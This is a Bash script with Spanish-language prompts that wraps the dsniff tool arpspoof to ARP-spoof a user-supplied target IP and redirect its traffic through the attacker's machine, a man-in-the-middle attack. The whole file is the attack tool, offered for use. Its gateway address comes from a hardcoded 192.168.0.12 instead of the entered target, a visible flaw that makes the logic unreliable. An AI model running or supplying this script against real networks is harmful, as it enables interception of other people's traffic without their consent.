#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c() {
    echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n"
    exit 1
}

trap ctrl_c SIGINT

echo -e "\n${yellowColour}[+]${endColour}${grayColour} Creado por cifucarst${endColour}"

cat << "EOF" 
    ___       _ _ 
  / _ \_____| (_|
 | (_) |_____| |_ 
  \___/     |___/ 

cifucarst 
EOF

function check_herramienta(){
    if ! [ -x "$(which $1)" ];then
        echo "\n${redColour}[!]Error: $1 no esta instalado. por favor, instala $1 y vuelve a intentarlo.${endColour}" >&2
        exit 1
    fi
}

check_herramienta "dsniff"

read -p "Inserte la interfaz de red que quieres analizar=> " interfaz
read -p "Inserte la IP objetivo=> " ip

puerta_enlace=$(echo 192.168.0.12 | sed 's/\([0-9]\+\)$/1/g')

arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"